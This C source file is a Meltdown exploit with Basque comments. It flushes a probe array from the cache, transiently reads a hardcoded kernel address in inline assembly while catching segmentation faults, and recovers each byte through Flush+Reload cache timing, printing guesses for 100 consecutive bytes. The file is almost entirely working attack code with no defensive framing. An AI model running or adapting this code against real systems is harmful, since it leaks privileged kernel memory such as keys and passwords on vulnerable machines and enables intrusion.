#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>

#define THRESHOLD 80  		// Cache irakurketaren denbora muga
#define TRIES 200           //  Filtraketa azterketa kopurua, geroz eta gehiago zehatzago
#define ARRAY 256
#define FLUSH 5   		 	// Memoriatik zenbat aldiz urratu
#define IRAKURKETA 100		// Zenbat irakurketa

uint8_t array[ARRAY*4096];
static sigjmp_buf jbuf;

void handle_segfault(int sig) {
    siglongjmp(jbuf, 1);
}

void flush_cache() {
    for (int r = 0; r < FLUSH; r++) {
        for (int i = 0; i < ARRAY; i++) {
            _mm_clflush(&array[i*4096]);
        }
    }
}

void reload_cache(int *scores) {
    volatile uint8_t *addr;
    register uint64_t time1, time2;
    unsigned int junk;
    
    for (int i = 0; i < ARRAY; i++) {
        addr = &array[i*4096];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= THRESHOLD) {
            scores[i]++;
        }
    }
}

void meltdown(unsigned long addr) {
    int scores[ARRAY] = {0};
    signal(SIGSEGV, handle_segfault);

    for (int t = 0; t < TRIES; t++) {
        flush_cache();
        _mm_mfence();

        if (sigsetjmp(jbuf, 1) == 0) {
          
            asm volatile (
                ".rept 300\n\t"          
                "add $0x141, %%rax\n\t"
                ".endr\n\t"
                "1:\n\t"
                "movzbl (%[addr]), %%eax\n\t"
                "shl $12, %%rax\n\t"
                "movb (%[array],%%rax,1), %%cl\n\t"
                "2:\n\t"
                : 
                : [array] "r" (array), [addr] "r" (addr)
                : "rax", "rcx", "memory"
            );
        }
        
        reload_cache(scores);
    }

	// Denboren analisia
    int top[3] = {0};
    for (int i = 1; i < ARRAY; i++) {
        if (scores[i] > scores[top[0]]) {
            top[2] = top[1]; top[1] = top[0]; top[0] = i;
        } else if (scores[i] > scores[top[1]]) {
            top[2] = top[1]; top[1] = i;
        } else if (scores[i] > scores[top[2]]) {
            top[2] = i;
        }
    }
    
    printf("Denbora onenak: %c (%d), %c (%d), %c (%d)\n", 
           top[0], top[0], top[1], top[1], top[2], top[2]);
}

int main() {
    // Arraya hasieratu
    for (int i = 0; i < ARRAY*4096; i++) {
        array[i] = 1;
    }

    unsigned long addr = 0xffff888105900000;
    for (int i = 0; i < IRAKURKETA; i++) {
        printf("Byte %d: ", i);
        meltdown(addr);
	addr++;
    }
    
    return 0;
}
